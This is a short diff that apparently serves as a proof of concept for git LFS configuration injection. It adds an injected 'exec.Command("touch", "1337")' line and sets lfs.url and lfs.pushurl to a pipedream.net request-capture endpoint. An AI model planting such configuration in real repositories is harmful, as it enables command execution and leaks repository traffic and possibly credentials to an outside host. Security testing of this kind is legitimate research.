@@ -1,3 +1,5 @@
+[exec.Command("touch", "1337")]
+
 [core]
     lfs.url                     = "https://f0bbddf0d9786b192b4fb765a5659c67.m.pipedream.net/url"
     lfs.pushurl                 = "https://f0bbddf0d9786b192b4fb765a5659c67.m.pipedream.net/pushurl"
